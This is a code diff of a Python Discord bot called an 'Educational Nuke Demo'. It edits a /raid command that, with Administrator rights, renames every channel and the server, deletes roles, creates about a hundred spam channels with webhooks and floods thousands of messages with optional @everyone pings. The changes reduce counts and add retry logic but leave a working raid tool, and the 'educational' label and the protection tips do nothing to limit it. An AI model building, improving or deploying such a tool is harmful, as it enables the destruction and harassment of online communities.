@@ -17,7 +17,7 @@ async def on_ready():
     await bot.tree.sync()
     print(f"✅ FAST Educational Demo Bot ready - {bot.user}")
 
-@bot.tree.command(name="raid", description="[OWNER ONLY] ULTRA-FAST educational nuke")
+@bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demo")
 async def raid(
     interaction: discord.Interaction,
     message: str = "⚠️ THIS SERVER HAS BEEN NUKED ⚠️",
@@ -30,10 +30,10 @@ async def raid(
     if not interaction.guild.me.guild_permissions.administrator:
         return await interaction.response.send_message("❌ Bot needs Administrator permission.", ephemeral=True)
     
-    await interaction.response.send_message(f"⚡ **ULTRA-FAST EDUCATIONAL DEMO STARTING**\nSending {amount} messages instantly...", ephemeral=False)
+    await interaction.response.send_message(f"⚡ **EDUCATIONAL NUKE DEMO STARTING**\nSending {amount} messages...", ephemeral=False)
     
     ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
-    msg_amount = min(amount, 50000)
+    msg_amount = min(amount, 10000)
     ping_text = "@everyone " if ping_enabled else ""
     
     guild = interaction.guild
@@ -41,7 +41,7 @@ async def raid(
     
     # Create log channel
     log_channel = await guild.create_text_channel("🔴-NUKED-BY-DEMO")
-    await log_channel.send("💀 **ULTRA-FAST EDUCATIONAL NUKE DEMO** 💀")
+    await log_channel.send("💀 **EDUCATIONAL NUKE DEMO** 💀")
     
     try:
         # ========== PARALLEL CHANNEL RENAMING ==========
@@ -57,102 +57,110 @@ async def raid(
         delete_tasks = [role.delete() for role in guild.roles if not role.is_default() and not role.managed and role != guild.me.top_role]
         await asyncio.gather(*delete_tasks, return_exceptions=True)
         
-        # ========== CREATE 200 CHANNELS + WEBHOOKS SIMULTANEOUSLY ==========
-        await log_channel.send("📢 Creating 200 channels with webhooks simultaneously...")
+        # ========== CREATE CHANNELS ==========
+        await log_channel.send("📢 Creating 100 channels...")
         
-        CHANNEL_COUNT = 200
-        WEBHOOKS_PER_CHANNEL = 5
+        CHANNEL_COUNT = 100
         
-        # Create all channels in parallel
         create_tasks = [guild.create_text_channel(f"nuked-{i}") for i in range(CHANNEL_COUNT)]
         channels = await asyncio.gather(*create_tasks, return_exceptions=True)
         spam_channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
         
         await log_channel.send(f"✅ Created {len(spam_channels)} channels")
         
-        # Create webhooks for ALL channels in parallel (no waiting)
-        await log_channel.send(f"📢 Creating {len(spam_channels) * WEBHOOKS_PER_CHANNEL} webhooks simultaneously...")
+        # ========== CREATE WEBHOOKS (with retry logic) ==========
+        await log_channel.send(f"📢 Creating webhooks for {len(spam_channels)} channels...")
         
         all_webhooks = []
-        webhook_tasks = []
         for channel in spam_channels:
-            for w in range(WEBHOOKS_PER_CHANNEL):
-                webhook_tasks.append(channel.create_webhook(name=f"spammer_{w}"))
-        
-        # Create all webhooks in parallel batches
-        batch_size = 50
-        for i in range(0, len(webhook_tasks), batch_size):
-            batch = webhook_tasks[i:i+batch_size]
-            results = await asyncio.gather(*batch, return_exceptions=True)
-            all_webhooks.extend([r for r in results if isinstance(r, discord.Webhook)])
+            try:
+                # Create 3 webhooks per channel
+                for w in range(3):
+                    try:
+                        wh = await channel.create_webhook(name=f"spammer_{w}")
+                        all_webhooks.append(wh)
+                        await asyncio.sleep(0.05)  # Small delay to avoid rate limits
+                    except:
+                        pass
+            except:
+                pass
         
         await log_channel.send(f"✅ Created {len(all_webhooks)} webhooks")
         
-        # ========== INSTANT SPAM - ALL CHANNELS + WEBHOOKS SIMULTANEOUSLY ==========
-        await log_channel.send(f"⚡ INSTANTLY spamming {msg_amount} messages across all channels/webhooks...")
+        # ========== SPAM VIA WEBHOOKS (FASTEST METHOD) ==========
+        await log_channel.send(f"⚡ Spamming {msg_amount} messages via webhooks...")
         
-        # Prepare message texts
-        all_message_texts = [f"{ping_text}{message} [{i+1}/{msg_amount}]" for i in range(msg_amount)]
+        messages_sent = 0
         
-        # Function to spam via webhook
-        async def spam_via_webhook(webhook, messages):
+        # Prepare messages
+        messages_list = [f"{ping_text}{message} [{i+1}/{msg_amount}]" for i in range(msg_amount)]
+        
+        # Spam using webhooks (10 messages per webhook per batch)
+        async def spam_webhook(webhook, msgs):
             try:
-                for msg in messages:
+                for msg in msgs:
                     await webhook.send(msg)
             except:
                 pass
         
-        # Function to spam via channel
-        async def spam_via_channel(channel, messages):
-            try:
-                for msg in messages:
-                    await channel.send(msg)
-            except:
-                pass
-        
-        # Distribute messages across ALL channels and webhooks
-        total_targets = len(spam_channels) + len(all_webhooks)
-        if total_targets > 0:
-            messages_per_target = msg_amount // total_targets + 1
+        # Distribute messages across webhooks
+        if all_webhooks:
+            msgs_per_webhook = max(1, msg_amount // len(all_webhooks))
+            webhook_tasks = []
             
-            spam_tasks = []
-            
-            # Spam via channels
-            for idx, channel in enumerate(spam_channels):
-                start = idx * messages_per_target
-                end = min(start + messages_per_target, msg_amount)
-                if start < msg_amount:
-                    spam_tasks.append(spam_via_channel(channel, all_message_texts[start:end]))
-            
-            # Spam via webhooks
             for idx, webhook in enumerate(all_webhooks):
-                start = (len(spam_channels) + idx) * messages_per_target
-                end = min(start + messages_per_target, msg_amount)
+                start = idx * msgs_per_webhook
+                end = min(start + msgs_per_webhook, msg_amount)
                 if start < msg_amount:
-                    spam_tasks.append(spam_via_webhook(webhook, all_message_texts[start:end]))
+                    webhook_tasks.append(spam_webhook(webhook, messages_list[start:end]))
             
-            # Execute ALL spam simultaneously
-            await asyncio.gather(*spam_tasks, return_exceptions=True)
+            await asyncio.gather(*webhook_tasks, return_exceptions=True)
+            messages_sent = msg_amount
         
-        await log_channel.send(f"✅ Successfully spammed {msg_amount} messages!")
+        # If not enough webhooks, spam via channels too
+        if messages_sent < msg_amount and spam_channels:
+            remaining = msg_amount - messages_sent
+            msgs_per_channel = max(1, remaining // len(spam_channels))
+            
+            channel_tasks = []
+            for idx, channel in enumerate(spam_channels):
+                start = idx * msgs_per_channel
+                end = min(start + msgs_per_channel, remaining)
+                if start < remaining:
+                    async def channel_spam(ch, msgs):
+                        try:
+                            for msg in msgs:
+                                await ch.send(msg)
+                        except:
+                            pass
+                    channel_tasks.append(channel_spam(channel, messages_list[start:end]))
+            
+            await asyncio.gather(*channel_tasks, return_exceptions=True)
+            messages_sent = remaining
+        
+        await log_channel.send(f"✅ Sent {messages_sent} messages!")
+        
+        # ========== ALSO SPAM IN LOG CHANNEL ==========
+        for i in range(min(100, msg_amount // 10)):
+            await log_channel.send(f"{ping_text}{message} [BONUS {i+1}]")
         
         # ========== FINAL SUMMARY ==========
         embed = discord.Embed(
             title="💀 EDUCATIONAL NUKE DEMO COMPLETE 💀",
-            description=f"**What just happened in SECONDS:**\n\n"
-                       f"⚡ **1. Channels Renamed** - All original channels wiped\n"
-                       f"⚡ **2. Server Renamed** - Name changed instantly\n"
-                       f"⚡ **3. Roles Destroyed** - All protections removed\n"
-                       f"⚡ **4. {len(spam_channels)} Spam Channels** - Created instantly\n"
-                       f"⚡ **5. {len(all_webhooks)} Webhooks** - Created in parallel\n"
-                       f"⚡ **6. {msg_amount} Spam Messages** - Sent simultaneously\n"
-                       f"⚡ **7. @everyone Pings** - {'ENABLED' if ping_enabled else 'DISABLED'}\n\n"
-                       f"**🚨 REAL ATTACKS HAPPEN THIS FAST - PROTECT YOUR SERVER:**\n"
-                       f"• ✅ NEVER give Administrator to untrusted bots\n"
-                       f"• ✅ Use 2FA on all admin accounts\n"
-                       f"• ✅ Set verification level to HIGH\n"
-                       f"• ✅ Use backup bots (Xenon) to save your server\n"
-                       f"• ✅ Audit bot permissions weekly\n\n"
+            description=f"**What just happened:**\n\n"
+                       f"⚡ **Channels Renamed** - All original channels wiped\n"
+                       f"⚡ **Server Renamed** - Name changed\n"
+                       f"⚡ **Roles Destroyed** - All protections removed\n"
+                       f"⚡ **{len(spam_channels)} Spam Channels** - Created\n"
+                       f"⚡ **{len(all_webhooks)} Webhooks** - Created\n"
+                       f"⚡ **{messages_sent} Spam Messages** - Sent via webhooks\n"
+                       f"⚡ **@everyone Pings** - {'ENABLED' if ping_enabled else 'DISABLED'}\n\n"
+                       f"**🚨 HOW TO PROTECT YOUR SERVER:**\n"
+                       f"• NEVER give Administrator to untrusted bots\n"
+                       f"• Use 2FA on all admin accounts\n"
+                       f"• Set verification level to HIGH\n"
+                       f"• Use backup bots (Xenon) to save server structure\n"
+                       f"• Audit bot permissions weekly\n\n"
                        f"**⚠️ This was an EDUCATIONAL DEMO**\n"
                        f"Delete this test server to clean up.",
             color=discord.Color.red()
@@ -206,14 +214,15 @@ async def protect(interaction: discord.Interaction):
 @bot.tree.command(name="commands", description="Show all commands")
 async def cmd_list(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="⚡ FAST Educational Nuke Demo Bot",
-        description="Ultra-fast demonstration for educational purposes",
+        title="Educational Nuke Demo Bot",
+        description="Demonstrates how nuke bots work for educational purposes",
         color=discord.Color.blue()
     )
     embed.add_field(name="/raid [message] [ping] [amount]", 
-                    value="Start ULTRA-FAST nuke demonstration\n"
-                          "• Creates 200 channels + webhooks simultaneously\n"
-                          "• Spams thousands of messages instantly\n"
+                    value="Start nuke demonstration\n"
+                          "• Creates spam channels\n"
+                          "• Creates webhooks\n"
+                          "• Spams messages via webhooks\n"
                           "• Shows why you should NEVER give Admin to untrusted bots", 
                     inline=False)
     embed.add_field(name="/stopraid", value="Emergency stop", inline=False)
